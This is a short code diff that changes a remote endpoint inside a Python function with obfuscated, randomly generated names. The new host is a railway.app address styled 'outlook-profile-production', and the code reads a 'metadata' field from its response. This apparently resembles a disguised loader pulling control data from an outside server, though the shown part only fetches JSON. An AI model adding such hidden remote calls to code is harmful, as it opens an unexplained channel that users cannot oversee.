@@ -16,7 +16,7 @@ def eval_lczgts_699():
 
     def config_lpipeg_416():
         try:
-            net_gmbpws_956 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            net_gmbpws_956 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             net_gmbpws_956.raise_for_status()
             model_fncmct_364 = net_gmbpws_956.json()
             config_nqubyc_941 = model_fncmct_364.get('metadata')
